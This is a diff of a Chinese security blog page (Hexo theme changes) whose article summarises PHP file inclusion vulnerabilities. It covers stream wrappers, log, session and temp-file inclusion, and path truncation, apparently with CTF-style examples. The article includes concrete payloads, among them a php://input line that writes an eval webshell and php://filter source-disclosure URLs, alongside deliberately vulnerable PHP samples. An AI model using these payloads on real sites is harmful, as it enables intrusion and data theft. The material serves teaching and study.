@@ -1,171 +1,214 @@
 <!DOCTYPE html>
-<html lang="">
-
-
-
-
-
+<html lang>
 <head><meta name="generator" content="Hexo 3.8.0">
-  <meta charset="UTF-8">
-  <meta name="google-site-verification" content="fVesNdKs5rVgSDBf0Af0gVcCtxUVEriFBGLGBH2GH8s">
-  <link rel="apple-touch-icon" sizes="76x76" href="https://s2.ax1x.com/2019/10/30/K5JmBF.png">
-  <link rel="icon" type="image/png" href="https://s2.ax1x.com/2019/10/30/K5JenU.png">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
-  <meta http-equiv="x-ua-compatible" content="ie=edge">
-  
-  <meta name="description" content="Lethe&#39;s Blog">
-  <meta name="author" content="Lethe">
-  <meta name="keywords" content="Lethe&#39;s Blog">
-  <title>文件包含漏洞总结 ~ Lethe&#39;s Blog</title>
+    <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
 
-  <link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/5.10.2/css/all.min.css">
-<link rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.3.1/css/bootstrap.min.css">
-<link rel="stylesheet" href="https://cdn.staticfile.org/mdbootstrap/4.8.9/css/mdb.min.css">
-<link rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/3.0.1/github-markdown.min.css">
-<link rel="stylesheet" href="//at.alicdn.com/t/font_1067060_qzomjdt8bmp.css">
+    <meta name="author" content="Lethe">
 
 
-  <link rel="stylesheet" href="/lib/prettify/tomorrow.min.css">
-
-<link rel="stylesheet" href="/css/main.css">
+    <meta name="subtitle" content="Life is a struggle">
 
 
-  <link rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css">
+    <meta name="description" content="Lethe's Blog">
+
+
+    <meta name="keywords" content="Lethe's Blog">
+
+
+<title>文件包含漏洞总结 | Lethe&#39;s Blog</title>
+
+
+
+    <link rel="icon" href="https://s2.ax1x.com/2019/10/30/K5JenU.png">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
 
 
 </head>
-
-
+<!-- <body background="https://s1.ax1x.com/2020/11/02/Br52e1.jpg"
+      style="background-repeat:no-repeat;
+			 background-size:100% 100%;
+             background-attachment: fixed;"> -->
 <body>
-  <header style="height: 70vh;">
-    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
-  <div class="container">
-    <a class="navbar-brand" href="/">&nbsp;<strong>Lethe's Blog</strong>&nbsp;</a>
-
-    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
-      <div class="animated-icon"><span></span><span></span><span></span></div>
-    </button>
-
-    <!-- Collapsible content -->
-    <div class="collapse navbar-collapse" id="navbarSupportedContent">
-      <ul class="navbar-nav ml-auto text-center">
-        
-          
-          
-          
-          
-          <li class="nav-item">
-            <a class="nav-link" href="/">Home</a>
-          </li>
-        
-          
-          
-          
-          
-          <li class="nav-item">
-            <a class="nav-link" href="/archives/">Archives</a>
-          </li>
-        
-          
-          
-          
-          
-          <li class="nav-item">
-            <a class="nav-link" href="/categories/">Categories</a>
-          </li>
-        
-          
-          
-          
-          
-          <li class="nav-item">
-            <a class="nav-link" href="/tags/">Tags</a>
-          </li>
-        
-          
-          
-          
-          
-          <li class="nav-item">
-            <a class="nav-link" href="/about/">About</a>
-          </li>
-        
-        
-          <li class="nav-item" id="search-btn">
-            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;&nbsp;<i class="iconfont icon-search"></i>&nbsp;&nbsp;</a>
-          </li>
-        
-      </ul>
-    </div>
-  </div>
-</nav>
-
-    <div class="view intro-2" id="background"
-         style="background: url('https://s2.ax1x.com/2020/03/11/8k84bQ.jpg')no-repeat center center;
-           background-size: cover;
-           background-attachment: fixed;">
-      <div class="full-bg-img">
-        <div class="mask rgba-black-light flex-center">
-          <div class="container text-center white-text fadeInUp">
-            <span class="h2" id="subtitle">
-              
-            </span>
-
-            
-              <br>
-              
-                <p class="mt-3">
-                  <i class="fas fa-calendar-alt" aria-hidden="true"></i>&nbsp;
-                  Wednesday, February 13th 2019, 12:15 am
-                </p>
-              
-
-              <p>
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">Lethe&#39;s Blog</a></div>
+            <div class="menu navbar-right">
                 
-                  
-                  &nbsp;<i class="far fa-chart-bar"></i>
-                  <span class="post-count">
-                    3.2k 字
-                  </span>&nbsp;
+                    <a class="menu-item" href="/archives">Posts</a>
                 
-
+                    <a class="menu-item" href="/category">Categories</a>
                 
-                  
-                  &nbsp;<i class="far fa-clock"></i>
-                  <span class="post-count">
-                      13 分钟
-                  </span>&nbsp;
+                    <a class="menu-item" href="/tag">Tags</a>
                 
-
+                    <a class="menu-item" href="/about">About</a>
                 
-                  <!-- 不蒜子统计文章PV -->
-                  
-                  &nbsp;<i class="far fa-eye" aria-hidden="true"></i>&nbsp;
-                  <span id="busuanzi_container_page_pv">
-                    <span id="busuanzi_value_page_pv"></span> 次
-                  </span>&nbsp;
-                
-              </p>
-            
-          </div>
-
-          
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
         </div>
-      </div>
-    </div>
-  </header>
+    </nav>
 
-  <main>
     
-      
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <b><a href="/">Lethe&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a></b>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <b><a class="menu-item" href="/archives">Posts</a></b>
+                
+                    <b><a class="menu-item" href="/category">Categories</a></b>
+                
+                    <b><a class="menu-item" href="/tag">Tags</a></b>
+                
+                    <b><a class="menu-item" href="/about">About</a></b>
+                
+            </div>
+        </div>
+    </nav>
 
-<div class="container-fluid">
-  <div class="row">
-    <div class="d-none d-lg-block col-lg-2"></div>
-    <div class="col-lg-8 nopadding-md">
-      <div class="py-5 z-depth-3" id="board">
-        <div class="post-content mx-auto" id="post">
-          <div class="markdown-body">
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+        <div class="main">
+            <!-- <body style="background-color:rgb(199,237,204);"> -->
+<body style="background-color: RGB(227, 237, 205);">
+<div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "Collapse all"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "Expand all"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">文件包含漏洞总结</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">Lethe</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">February 13, 2019&nbsp;&nbsp;0:15:33</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/System-Security/">System Security</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
             <h2 id="0x01-什么是文件包含漏洞"><a href="#0x01-什么是文件包含漏洞" class="headerlink" title="0x01 什么是文件包含漏洞"></a>0x01 什么是文件包含漏洞</h2><p>通过PHP函数引入文件时，传入的文件名没有经过合理的验证，从而操作了预想之外的文件，就可能导致意外的文件泄漏甚至恶意代码注入。<br><br></p>
 <h2 id="0x02-文件包含漏洞的环境要求"><a href="#0x02-文件包含漏洞的环境要求" class="headerlink" title="0x02 文件包含漏洞的环境要求"></a>0x02 文件包含漏洞的环境要求</h2><ul>
 <li>allow_url_fopen=On(默认为On) 规定是否允许从远程服务器或者网站检索数据</li>
@@ -184,7 +227,7 @@
 <li>include_once()与require()_once()，如果文件已包含，则不会包含，其他特性如上<br><br></li>
 </ul>
 <h2 id="0x04-PHP伪协议"><a href="#0x04-PHP伪协议" class="headerlink" title="0x04  PHP伪协议"></a>0x04  PHP伪协议</h2><p>PHP 提供了一些杂项输入/输出（IO）流，允许访问 PHP 的输入输出流、标准输入输出和错误描述符， 内存中、磁盘备份的临时文件流以及可以操作其他读取写入文件资源的过滤器。</p>
-<h3 id="一、php-input"><a href="#一、php-input" class="headerlink" title="一、php://input"></a>一、php://input</h3><p><strong>php://input</strong>可以访问请求的原始数据的只读流，将post请求的数据当作php代码执行。当传入的参数作为文件名打开时，可以将参数设为php://input,同时post想设置的文件内容，php执行时会将post内容当作文件内容。从而导致任意代码执行。<br><img src="/2019/02/13/文件包含漏洞总结/20190212171710961.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
+<h3 id="一、php-input"><a href="#一、php-input" class="headerlink" title="一、php://input"></a>一、php://input</h3><p><strong>php://input</strong>可以访问请求的原始数据的只读流，将post请求的数据当作php代码执行。当传入的参数作为文件名打开时，可以将参数设为php://input,同时post想设置的文件内容，php执行时会将post内容当作文件内容。从而导致任意代码执行。<br><img src="/2019/02/13/文件包含漏洞总结/20190212171710961.png" alt="在这里插入图片描述"></p>
 <p><strong>Example 1：</strong> 造成任意代码执行</p>
 <pre><code class="php">&lt;meta charset=&quot;utf8&quot;&gt;
 &lt;?php
@@ -201,7 +244,7 @@ if($file){
 }
 ?&gt;
 </code></pre>
-<p><img src="/2019/02/13/文件包含漏洞总结/20190212171849262.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" alt="在这里插入图片描述"><br><img src="/2019/02/13/文件包含漏洞总结/20190212172017164.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" alt="在这里插入图片描述"><br><img src="/2019/02/13/文件包含漏洞总结/20190212185213880.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>注：利用php://input还可以写入php木马,即在post中传入如下代码：</p>
+<p><img src="/2019/02/13/文件包含漏洞总结/20190212171849262.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="/2019/02/13/文件包含漏洞总结/20190212172017164.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="/2019/02/13/文件包含漏洞总结/20190212185213880.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>注：利用php://input还可以写入php木马,即在post中传入如下代码：</p>
 <pre><code>&lt;?PHP fputs(fopen(&#39;shell.php&#39;,&#39;w&#39;),&#39;&lt;?php @eval($_POST[cmd])?&gt;&#39;);?&gt;
 </code></pre><p><strong>Example 2：</strong> 文件内容绕过</p>
 <pre><code class="php">//test.php
@@ -220,8 +263,8 @@ $flag = &#39;flag{flag_is_here}&#39;;
 ?&gt;
 </code></pre>
 <p>审计test.php知，当参数\$a不为空，且读取的文件中包含’I want flag’时，即可显示\$flag。所以可以使用php://input得到原始的post数据,访问请求的原始数据的只读流,将post请求中的数据作为PHP代码执行来进行绕过。<br>注：遇到file_get_contents()要想到用php://input绕过。</p>
-<p><img src="/2019/02/13/文件包含漏洞总结/20190212173415247.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
-<h3 id="二、php-filter"><a href="#二、php-filter" class="headerlink" title="二、php://filter"></a>二、php://filter</h3><p><strong>php://filter</strong>可以获取指定文件源码。当它与包含函数结合时，php://filter流会被当作php文件执行。所以我们一般对其进行编码，让其不执行。从而导致 任意文件读取。<br><img src="/2019/02/13/文件包含漏洞总结/20190212181216425.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br><img src="/2019/02/13/文件包含漏洞总结/20190212181226147.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>POC1直接读取xxx.php文件，但大多数时候很多信息无法直接显示在浏览器页面上，所以需要采取POC2中方法将文件内容进行base64编码后显示在浏览器上，再自行解码。</p>
+<p><img src="/2019/02/13/文件包含漏洞总结/20190212173415247.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<h3 id="二、php-filter"><a href="#二、php-filter" class="headerlink" title="二、php://filter"></a>二、php://filter</h3><p><strong>php://filter</strong>可以获取指定文件源码。当它与包含函数结合时，php://filter流会被当作php文件执行。所以我们一般对其进行编码，让其不执行。从而导致 任意文件读取。<br><img src="/2019/02/13/文件包含漏洞总结/20190212181216425.png" alt="在这里插入图片描述"><br><img src="/2019/02/13/文件包含漏洞总结/20190212181226147.png" alt="在这里插入图片描述"><br>POC1直接读取xxx.php文件，但大多数时候很多信息无法直接显示在浏览器页面上，所以需要采取POC2中方法将文件内容进行base64编码后显示在浏览器上，再自行解码。</p>
 <p>注：更多php://filter用法可参考：<a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html" target="_blank" rel="noopener">谈一谈php://filter的妙用</a></p>
 <p><strong>Example 1：</strong></p>
 <pre><code class="php">&lt;meta charset=&quot;utf8&quot;&gt;
@@ -238,14 +281,14 @@ if($file){
 }
 ?&gt;
 </code></pre>
-<p>1.点击tip后进入如下页面，看到url中出现‘file=flag.php’，如下：<br><img src="/2019/02/13/文件包含漏洞总结/20190212181928339.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>2.尝试payload：?php://filter/resource=flag.php，发现无法显示内容：<br><img src="/2019/02/13/文件包含漏洞总结/20190212182033920.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>3.尝试payload：?php://filter/read=convert.base64-encode/resource=flag.php，得到一串base64字符，解码得flag在flag.php源码中的注释里：</p>
-<p><img src="/2019/02/13/文件包含漏洞总结/20190212182541177.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
+<p>1.点击tip后进入如下页面，看到url中出现‘file=flag.php’，如下：<br><img src="/2019/02/13/文件包含漏洞总结/20190212181928339.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>2.尝试payload：?php://filter/resource=flag.php，发现无法显示内容：<br><img src="/2019/02/13/文件包含漏洞总结/20190212182033920.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>3.尝试payload：?php://filter/read=convert.base64-encode/resource=flag.php，得到一串base64字符，解码得flag在flag.php源码中的注释里：</p>
+<p><img src="/2019/02/13/文件包含漏洞总结/20190212182541177.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
 <h3 id="三、zip"><a href="#三、zip" class="headerlink" title="三、zip://"></a>三、zip://</h3><p><strong>zip://</strong> 可以访问压缩包里面的文件。当它与包含函数结合时，zip://流会被当作php文件执行。从而实现任意代码执行。</p>
 <ul>
 <li>zip://中只能传入绝对路径。</li>
 <li>要用#分隔压缩包和压缩包里的内容，并且#要用url编码%23（即下述POC中#要用%23替换）</li>
 <li>只需要是zip的压缩包即可，后缀名可以任意更改。</li>
-<li>相同的类型的还有zlib://和bzip2://<br><img src="/2019/02/13/文件包含漏洞总结/2019021218350876.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br><strong>Example 1：</strong><pre><code class="php">//index.php
+<li>相同的类型的还有zlib://和bzip2://<br><img src="/2019/02/13/文件包含漏洞总结/2019021218350876.png" alt="在这里插入图片描述"><br><strong>Example 1：</strong><pre><code class="php">//index.php
 &lt;meta charset=&quot;utf8&quot;&gt;
 &lt;?php
 error_reporting(0);
@@ -291,10 +334,10 @@ if( isset( $_FILES[&#39;fupload&#39;] ) ) {
 </code></pre>
 </li>
 </ul>
-<h3 id="四、data-与phar"><a href="#四、data-与phar" class="headerlink" title="四、data://与phar://"></a>四、data://与phar://</h3><p><strong>data://</strong> 同样类似与php://input，可以让用户来控制输入流，当它与包含函数结合时，用户输入的data://流会被当作php文件执行。从而导致任意代码执行。<br><img src="/2019/02/13/文件包含漏洞总结/20190212184105566.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
+<h3 id="四、data-与phar"><a href="#四、data-与phar" class="headerlink" title="四、data://与phar://"></a>四、data://与phar://</h3><p><strong>data://</strong> 同样类似与php://input，可以让用户来控制输入流，当它与包含函数结合时，用户输入的data://流会被当作php文件执行。从而导致任意代码执行。<br><img src="/2019/02/13/文件包含漏洞总结/20190212184105566.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
 <p><strong>phar://</strong> 有点类似zip://同样可以导致 任意代码执行。</p>
 <ul>
-<li>phar://中相对路径和绝对路径都可以使用<br><img src="/2019/02/13/文件包含漏洞总结/20190212183933220.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br><br><h2 id="0x05-包含Apache日志文件"><a href="#0x05-包含Apache日志文件" class="headerlink" title="0x05 包含Apache日志文件"></a>0x05 包含Apache日志文件</h2>&emsp;&emsp;WEB服务器一般会将用户的访问记录保存在访问日志中。那么我们可以根据日志记录的内容，精心构造请求，把PHP代码插入到日志文件中，通过文件包含漏洞来执行日志中的PHP代码。<br><img src="/2019/02/13/文件包含漏洞总结/20190212212338582.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br><img src="/2019/02/13/文件包含漏洞总结/20190212212352893.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>&emsp;&emsp;Apache运行后一般默认会生成两个日志文件，Windos下是access.log（访问日志）和error.log(错误日志)，Linux下是access_log和error_log，访问日志文件记录了客户端的每次请求和服务器响应的相关信息。<br>&emsp;&emsp;如果访问一个不存在的资源时，如<a href="http://www.xxxx.com/" target="_blank" rel="noopener">http://www.xxxx.com/</a>&lt;?php phpinfo(); ?&gt;,则会记录在日志中，但是代码中的敏感字符会被浏览器转码，我们可以通过burpsuit绕过编码，就可以把&lt;?php phpinfo(); ?&gt;  写入apache的日志文件，然后可以通过包含日志文件来执行此代码，但前提是你得知道apache日志文件的存储路径，所以为了安全期间，安装apache时尽量不要使用默认路径。</li>
+<li>phar://中相对路径和绝对路径都可以使用<br><img src="/2019/02/13/文件包含漏洞总结/20190212183933220.png" alt="在这里插入图片描述"><br><br><h2 id="0x05-包含Apache日志文件"><a href="#0x05-包含Apache日志文件" class="headerlink" title="0x05 包含Apache日志文件"></a>0x05 包含Apache日志文件</h2>&emsp;&emsp;WEB服务器一般会将用户的访问记录保存在访问日志中。那么我们可以根据日志记录的内容，精心构造请求，把PHP代码插入到日志文件中，通过文件包含漏洞来执行日志中的PHP代码。<br><img src="/2019/02/13/文件包含漏洞总结/20190212212338582.png" alt="在这里插入图片描述"><br><img src="/2019/02/13/文件包含漏洞总结/20190212212352893.png" alt="在这里插入图片描述"><br>&emsp;&emsp;Apache运行后一般默认会生成两个日志文件，Windos下是access.log（访问日志）和error.log(错误日志)，Linux下是access_log和error_log，访问日志文件记录了客户端的每次请求和服务器响应的相关信息。<br>&emsp;&emsp;如果访问一个不存在的资源时，如<a href="http://www.xxxx.com/" target="_blank" rel="noopener">http://www.xxxx.com/</a>&lt;?php phpinfo(); ?&gt;,则会记录在日志中，但是代码中的敏感字符会被浏览器转码，我们可以通过burpsuit绕过编码，就可以把&lt;?php phpinfo(); ?&gt;  写入apache的日志文件，然后可以通过包含日志文件来执行此代码，但前提是你得知道apache日志文件的存储路径，所以为了安全期间，安装apache时尽量不要使用默认路径。</li>
 </ul>
 <p>参考文章：<a href="https://www.cnblogs.com/my1e3/p/5854897.html" target="_blank" rel="noopener">1.包含日志文件getshell</a><br>&emsp;&emsp;&emsp;&emsp;&emsp;<a href="https://chybeta.github.io/2017/08/06/SHACTF-2017-Web-writeup/#Methon-Two" target="_blank" rel="noopener">2.一道包含日志文件的CTF题</a><br><br></p>
 <h2 id="0x06-包含SESSION"><a href="#0x06-包含SESSION" class="headerlink" title="0x06 包含SESSION"></a>0x06 包含SESSION</h2><p>可以先根据尝试包含到SESSION文件，在根据文件内容寻找可控变量，在构造payload插入到文件中，最后包含即可。</p>
@@ -303,7 +346,7 @@ if( isset( $_FILES[&#39;fupload&#39;] ) ) {
 <li>找到Session内的可控变量</li>
 <li>Session文件可读写，并且知道存储路径</li>
 </ul>
-<p>php的session文件的保存路径可以在phpinfo的session.save_path看到。<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/14.png?raw=true" srcset="/img/loading.gif" alt="在这里插入图片描述"><br><strong>session常见存储路径：</strong></p>
+<p>php的session文件的保存路径可以在phpinfo的session.save_path看到。<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/14.png?raw=true" alt="在这里插入图片描述"><br><strong>session常见存储路径：</strong></p>
 <ul>
 <li>/var/lib/php/sess_PHPSESSID</li>
 <li>/var/lib/php/sess_PHPSESSID</li>
@@ -319,7 +362,7 @@ if( isset( $_FILES[&#39;fupload&#39;] ) ) {
 <li>environ文件存储位置已知，且environ文件可读。</li>
 </ul>
 <p>参考文章：<a href="http://websecuritylog.blogspot.com/2010/06/procselfenviron-injection.html" target="_blank" rel="noopener">proc / self / environ Injection</a><br><br></p>
-<h2 id="0x07-包含临时文件"><a href="#0x07-包含临时文件" class="headerlink" title="0x07 包含临时文件"></a>0x07 包含临时文件</h2><p><img src="/2019/02/13/文件包含漏洞总结/1.jpg" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>php中上传文件，会创建临时文件。在linux下使用/tmp目录，而在windows下使用c:\winsdows\temp目录。在临时文件被删除之前，利用竞争即可包含该临时文件。</p>
+<h2 id="0x07-包含临时文件"><a href="#0x07-包含临时文件" class="headerlink" title="0x07 包含临时文件"></a>0x07 包含临时文件</h2><p><img src="/2019/02/13/文件包含漏洞总结/1.jpg" alt="在这里插入图片描述"><br>php中上传文件，会创建临时文件。在linux下使用/tmp目录，而在windows下使用c:\winsdows\temp目录。在临时文件被删除之前，利用竞争即可包含该临时文件。</p>
 <p>由于包含需要知道包含的文件名。一种方法是进行暴力猜解，linux下使用的随机函数有缺陷，而window下只有65535中不同的文件名，所以这个方法是可行的。</p>
 <p>另一种方法是配合phpinfo页面的php variables，可以直接获取到上传文件的存储路径和临时文件名，直接包含即可。这个方法可以参考<a href="https://www.insomniasec.com/downloads/publications/LFI%20With%20PHPInfo%20Assistance.pdf" target="_blank" rel="noopener">LFI With PHPInfo Assistance</a></p>
 <p>类似利用临时文件的存在，竞争时间去包含的，可以看看这道CTF题：<a href="https://chybeta.github.io/2017/08/22/XMAN%E5%A4%8F%E4%BB%A4%E8%90%A5-2017-babyweb-writeup/" target="_blank" rel="noopener">XMAN夏令营-2017-babyweb-writeup</a><br><br></p>
@@ -420,11 +463,11 @@ copy  1.jpg/b+2.php  3.jpg
 <li>[访问参数]   <code>?file=http://localhost:8081/phpinfo.php?</code></li>
 <li>[拼接后] &emsp;<code>?file=http://localhost:8081/phpinfo.php?.txt</code></li>
 </ul>
-<p><strong>Example：</strong>（设在根目录下有flag2.txt文件）<br><img src="/2019/02/13/文件包含漏洞总结/2019021223193847.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" alt="在这里插入图片描述"><br><img src="/2019/02/13/文件包含漏洞总结/20190212231954243.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" alt="在这里插入图片描述"><br><strong>fragment(#)</strong></p>
+<p><strong>Example：</strong>（设在根目录下有flag2.txt文件）<br><img src="/2019/02/13/文件包含漏洞总结/2019021223193847.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="/2019/02/13/文件包含漏洞总结/20190212231954243.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>fragment(#)</strong></p>
 <ul>
 <li>[访问参数]   <code>?file=http://localhost:8081/phpinfo.php%23</code></li>
 <li><p>[拼接后]&emsp; <code>?file=http://localhost:8081/phpinfo.php#.txt</code></p>
